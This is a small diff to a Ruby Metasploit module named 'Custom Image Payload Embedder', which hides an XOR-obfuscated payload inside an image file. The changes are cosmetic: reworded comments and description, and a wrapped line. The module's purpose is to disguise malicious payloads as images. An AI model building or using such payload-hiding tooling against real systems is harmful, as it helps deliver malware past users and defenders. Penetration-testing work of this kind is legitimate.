@@ -3,14 +3,14 @@
 require 'msf/core'
 require 'securerandom'
 
-# This class defines a Metasploit module that embeds a Metasploit payload into an image file.
+# This class defines a module that embeds a payload into an image file.
 class MetasploitModule < Msf::Exploit::Remote
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
       'Name' => 'Custom Image Payload Embedder',
-      'Description' => 'This module embeds a Metasploit payload into an image file.',
+      'Description' => 'This module embeds a payload into an image file.',
       'Author' => ['Webmaster-Exit-1'],
       'License' => MSF_LICENSE,
       'Platform' => 'linux',
@@ -29,7 +29,8 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def xor_encrypt(payload, key)
     key_bytes = key.bytes.cycle
-    payload.bytes.zip(key_bytes).map { |payload_byte, key_byte| payload_byte ^ key_byte }.pack('C*')
+    payload.bytes.zip(key_bytes).map { |payload_byte, key_byte| \
+      payload_byte ^ key_byte }.pack('C*')
   end
 
   def embed_payload_into_image(image_path, payload)
